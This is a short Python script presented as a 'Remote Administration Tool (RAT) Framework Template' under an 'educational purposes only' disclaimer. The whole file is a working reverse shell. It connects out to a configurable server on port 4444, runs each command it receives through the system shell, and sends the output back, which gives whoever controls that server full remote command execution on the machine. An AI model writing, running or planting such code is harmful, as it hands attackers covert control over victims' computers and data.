# Remote Administration Tool (RAT) Framework Template
# Educational purposes only. Ensure all usage abides by applicable laws.

import socket
import subprocess
import os
import threading

# Configuration
HOST = "127.0.0.1"  # Change to your server's IP address
PORT = 4444         # Port to connect to

def handle_connection():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))
            while True:
                command = s.recv(1024).decode("utf-8")
                if command.lower() == "exit":
                    break
                if command.startswith("cd "):
                    os.chdir(command[3:])
                    s.send(f"Changed directory to {os.getcwd()}\n".encode("utf-8"))
                else:
                    try:
                        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                        s.send(result)
                    except subprocess.CalledProcessError as e:
                        s.send(f"Error: {e}\n".encode("utf-8"))
        except Exception as e:
            print(f"Connection error: {e}")

# Start RAT
if __name__ == "__main__":
    thread = threading.Thread(target=handle_connection)
    thread.daemon = True
    thread.start()
    thread.join()
